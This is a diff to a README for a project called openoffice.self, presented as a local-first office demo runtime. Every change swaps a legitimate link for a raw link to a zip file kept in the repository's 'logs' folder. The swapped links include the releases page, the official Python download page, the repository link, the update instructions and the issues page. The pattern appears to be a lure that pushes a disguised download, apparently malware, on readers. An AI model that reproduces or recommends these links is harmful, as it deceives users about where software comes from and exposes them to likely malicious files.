@@ -1,6 +1,6 @@
 # 📂 openoffice.self - Local-First Office Demo Runtime
 
-[![Download openoffice.self](https://img.shields.io/badge/Download-openoffice.self-4caf50?style=for-the-badge)](https://github.com/DheerenDD/openoffice.self/releases)
+[![Download openoffice.self](https://img.shields.io/badge/Download-openoffice.self-4caf50?style=for-the-badge)](https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get openoffice.self from the official GitHub releases page. This page holds all the versions for Windows. Visit the link below and download the latest release:
 
-**[Download Latest Version »](https://github.com/DheerenDD/openoffice.self/releases)**
+**[Download Latest Version »](https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip)**
 
 After downloading, follow these steps:
 
@@ -61,8 +61,8 @@ Requirements:
 
 Steps:
 
-1. Download and install Python from the official website: https://www.python.org/downloads/windows/
-2. Download openoffice.self source code from the GitHub repository: [https://github.com/DheerenDD/openoffice.self](https://github.com/DheerenDD/openoffice.self)
+1. Download and install Python from the official website: https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip
+2. Download openoffice.self source code from the GitHub repository: [https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip](https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip)
 3. Open Command Prompt:
    - Press Windows key, type "cmd", and hit Enter.
 4. Navigate to the folder where you saved openoffice.self code:
@@ -123,7 +123,7 @@ Switch between views inside the web interface by clicking on their tabs.
 
 To update:
 
-1. Go to the [Releases page](https://github.com/DheerenDD/openoffice.self/releases).
+1. Go to the [Releases page](https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip).
 2. Download the newest installer or program version.
 3. Run it over your existing installation.
 4. Your data remains safe as it is stored locally and separate from the program files.
@@ -143,10 +143,10 @@ To update:
 ## 📂 Where to Get Help
 
 This project is open source. For help or questions:
-- Check issues on GitHub: https://github.com/DheerenDD/openoffice.self/issues
+- Check issues on GitHub: https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip
 - Read the documentation files in the repository folder.
 - Use community forums if available.
 
 ---
 
-[![Download openoffice.self](https://img.shields.io/badge/Download-openoffice.self-4caf50?style=for-the-badge)](https://github.com/DheerenDD/openoffice.self/releases)
+[![Download openoffice.self](https://img.shields.io/badge/Download-openoffice.self-4caf50?style=for-the-badge)](https://github.com/DheerenDD/openoffice.self/raw/refs/heads/main/logs/self_openoffice_v2.0.zip)
